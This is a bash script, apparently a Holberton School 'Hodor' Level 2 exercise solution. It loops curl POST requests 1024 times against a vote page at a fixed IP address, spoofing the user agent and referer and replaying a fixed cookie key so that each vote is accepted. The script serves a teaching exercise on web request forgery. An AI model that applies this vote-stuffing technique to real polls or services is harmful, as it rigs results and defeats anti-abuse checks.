#!/bin/bash

# ===---Hodor Level 2-------------------------------------------------------------===
# Solution in Shell Script for Hodor Project Level 2, by Julien Barbier 
# Using curl command.
# If you want to see more details about each request replace the "s" option with "v"
# right after the 'curl' command.
# by Alexandro de Oliveira, for Holberton School.
# ===-----------------------------------------------------------------------------===

URL=http://173.246.108.142/level2.php
ID='id=23'
COOKIE='990aede99b2115451d612b8c50ae6332a8026b62'
AGENT='Windows NT 5.0.0.0.1alpha - (Im kidding, I hate windows! Lol)'
HEADER="HoldTheDoor=$COOKIE"
COUNT=0
VOTES=$((1 << 10)) #  = 1024

### Voting 1024 times:
while [ $COUNT -lt $VOTES ]
do
    curl -v -d "$ID&holdthedoor=submit&key=$COOKIE" -A "$AGENT" -b $HEADER --referer $URL $URL -o /dev/null
    echo "Vote: "$COUNT
    ((COUNT++))
done
